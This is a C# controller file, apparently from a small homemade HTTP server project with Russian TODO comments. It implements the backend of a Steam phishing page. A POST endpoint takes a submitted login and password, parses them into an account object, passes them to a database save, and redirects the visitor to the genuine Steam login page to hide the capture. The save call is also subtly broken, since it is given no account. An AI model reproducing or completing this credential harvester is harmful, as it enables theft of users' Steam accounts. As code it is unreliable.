using System.Net;
using System.Text.RegularExpressions;
using HTTPServer.Models;
using HTTPServer.Services;

namespace HTTPServer.Controllers
{
    [ApiController("api")]
    public class ApiController
    {
        //TODO: сделать обработчик параметров, передавть уже готовую модель
        [HttpPost("save")]
        public async Task<HttpListenerResponse> SaveAccount(HttpListenerContext context)
        {
            var request = context.Request;
            var response = context.Response;
            var parameters = await HttpListenerRequestHelper.GetBodyDataAsync(request);
            if(TryParse(parameters, out SteamAccount? account))
            {
                await DBProvider.AddAsync();
                response.Headers.Set("Location", @"https://store.steampowered.com/login");
                return response.SetStatusCode((int)HttpStatusCode.SeeOther);
            }
            response.Headers.Set("Location", @"/");
            return response.SetStatusCode((int)HttpStatusCode.Redirect);
        }

        private static bool TryParse(string parameters, out SteamAccount? account)
        {
            //TODO: сделать в регулярке только лат символы и цифра
            string pattern = @"login=\b(\w+?)\b&password=\b(\w+?)\b";
            Regex rg = new Regex(pattern);
            if (string.IsNullOrEmpty(parameters) || !rg.IsMatch(parameters))
            {
                account = null;
                return false;
            }
            var data = parameters.Split(new[] { "/", "?", "login", "=", "password", "&" }, StringSplitOptions.RemoveEmptyEntries);
            if (data.Length == 2)
            {
                account = new SteamAccount() { Login = data[0], Password = data[1] };
                return true;
            }
            account = null;
            return false;
        }
    }
}